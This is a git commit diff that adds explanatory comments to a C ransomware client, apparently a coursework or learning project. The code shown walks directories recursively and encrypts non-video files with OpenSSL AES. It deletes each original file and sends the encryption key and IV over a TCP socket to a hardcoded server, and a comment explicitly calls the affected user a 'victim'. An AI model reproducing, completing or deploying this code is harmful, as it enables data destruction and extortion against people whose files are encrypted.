ef14fd2c6dbc832447df17c324ed0796e112c092
Thimothe Maljean <maljeantimothe@gmail.com>
2023-01-01 12:34:23 -0500

    FinalTestsOK

--- client.c
+++ client.c
@@ -4,11 +4,12 @@
 #include <string.h>
 #include <stdbool.h>
 #include <errno.h>
-
+#include <sys/stat.h>
+// librairies for encryption
 #include <openssl/conf.h>
 #include <openssl/evp.h>
 #include <openssl/err.h>
-
+// librairies for sockets
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -29,6 +30,7 @@ int main(int argc, char* argv[]){
     unsigned char key[32];
     unsigned char iv[16];
 
+    // if mode is -e, generate key and iv and send it to the remote server
     if(strcmp(argv[2],"-e") == 0){
 
         RAND_priv_bytes(key, 32);
@@ -36,7 +38,7 @@ int main(int argc, char* argv[]){
 
         sendKey(key,iv);
     }
-
+    // if mode is -d, read key and iv from files
     else if(strcmp(argv[2],"-d") == 0){
         FILE *key_file = fopen("key.bin", "rb");
         FILE *iv_file = fopen("iv.bin", "rb");
@@ -52,8 +54,8 @@ int main(int argc, char* argv[]){
         return 0;
     }
 
-
-    if(argc == 3){ 
+    // argv[2] -> -e = encrypt, -d = decrypt
+    if(argc == 3){ //argv[0] = program name, argv[1] = path, argv[2] = mode > argc = 3 -> interpreted in dirContent
         dirContent(argv[1],key,iv,argv[2]);
     }
     else{
@@ -68,7 +70,7 @@ int main(int argc, char* argv[]){
             return 0;
         }
     }
-
+    // clean the key and iv from memory
     memset(key, 0, 32);
     memset(iv, 0, 16);
 
@@ -89,9 +91,9 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
 
     while (sd!= NULL){
 
-        if(sd -> d_type == DT_DIR && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){  
-            char* new_path = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2); 
-            strcpy(new_path,""); 
+        if(sd -> d_type == DT_DIR && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){  //check if the path is a directory and not the current or parent directory(. and ..)
+            char* new_path = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2); //allocate memory for the new path with the size of the rootpath + the size of the directory name + 2 for the "/" and the null character at the end 
+            strcpy(new_path,""); // clean memory of the variable
             strncat(new_path,rootpath,strlen(rootpath));
             strcat(new_path,"/");
             strncat(new_path,sd ->d_name,strlen(sd->d_name));
@@ -101,9 +103,9 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
         }
 
         else{
-            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ 
+            if( sd -> d_type == DT_REG && strcmp(sd -> d_name,".") !=0 && strcmp(sd -> d_name,"..") !=0 ){ //check if the file is a regular file and not the current or parent directory
                 char* filepath = (char*)malloc(strlen(rootpath)+strlen(sd->d_name)+2);
-                strcpy(filepath,""); 
+                strcpy(filepath,""); // clean memory of the variable
                 strncat(filepath,rootpath,strlen(rootpath));
                 strcat(filepath,"/");
                 strncat(filepath,sd ->d_name,strlen(sd->d_name));
@@ -132,7 +134,7 @@ void dirContent(const char *rootpath, unsigned char *key, unsigned char *iv, cha
 }
 
 bool doUseFile(const char *filename){
-
+// if the file is a video extension, return false
     if(strstr(filename,".mp4") != NULL || strstr(filename,".avi") != NULL || strstr(filename,".mkv") != NULL || strstr(filename,".mov") != NULL || strstr(filename,".flv") != NULL){
         return false;
     }
@@ -262,9 +264,9 @@ int encryptFile(char *filename, unsigned char *key, unsigned char *iv){
         fwrite(ciphertext, 1, ciphertext_len, fileEncrypted);
         
     }
-
+    // delete original file
     remove(filename);
-
+    //close everything
     fclose(toEncrypt);
     fclose(fileEncrypted);
     free(plaintext);
@@ -289,9 +291,9 @@ int decryptFile(char *filename, unsigned char *key, unsigned char *iv){
         
         
     }
- 
+    // delete .enc file
     remove(filename);
-
+    //close everything
     fclose(toDecrypt);
     fclose(fileDecrypted);
     free(decryptedtext);
@@ -301,20 +303,20 @@ int decryptFile(char *filename, unsigned char *key, unsigned char *iv){
 }
 
 int sendKey(unsigned char *key, unsigned char *iv){
-
+    // create a socket
     int sockid = socket(AF_INET, SOCK_STREAM, 0);
     int server_port= 9999;
-    char *server_ip = "127.0.0.1";
+    char *server_ip = "127.0.0.1"; // IP is hardcoded, victim can't change it -> alternative is to use a Domain Name
 
     struct sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(9999);
     inet_aton(server_ip, &server_addr.sin_addr);
-
+    // connect to server
     connect(sockid, (struct sockaddr*)&server_addr, sizeof(server_addr));
 
 
- 
+    // send the key and iv to the server
     send(sockid, key, 32, 0);
     send(sockid, iv, 16, 0);
 
